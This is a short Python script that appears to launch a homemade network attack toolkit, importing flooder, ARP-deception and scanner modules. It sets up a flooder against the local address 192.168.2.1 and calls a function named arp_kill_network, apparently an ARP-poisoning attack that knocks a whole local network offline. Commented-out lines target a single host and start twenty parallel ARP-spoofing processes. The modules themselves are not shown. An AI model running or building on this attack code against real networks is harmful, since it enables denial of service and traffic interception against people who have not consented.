from multiprocessing import Process

from flooder import Flooder
from deception import Deceiver
from scanner import Scanners

if __name__ == '__main__':
    f = Flooder("192.168.2.1")
    d = Deceiver()
    s = Scanners()
    d.arp_kill_network()
    #d.arp_kill("192.168.2.1")

    #for i in range(0, 20):
    #    p = Process(target=d.arp_deceive, args=())
    #    p.start()

